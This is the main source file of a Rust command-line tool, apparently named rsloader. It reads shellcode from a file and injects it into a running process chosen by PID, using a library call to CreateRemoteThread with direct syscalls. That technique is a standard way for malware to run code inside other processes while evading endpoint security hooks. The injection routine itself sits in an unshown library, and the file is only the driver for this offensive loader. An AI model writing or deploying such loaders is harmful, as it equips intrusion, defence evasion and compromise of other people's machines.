use rsloader::ShellCode;

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 3 {
        println!("[+] usage: rsloader [input_path] [pid]");
        std::process::exit(0x0100);
    };

    let sc_object = ShellCode::from_file(&args[1]);
    sc_object.load_CreateRemoteThread_directSyscalls(args[2].parse().unwrap());
}
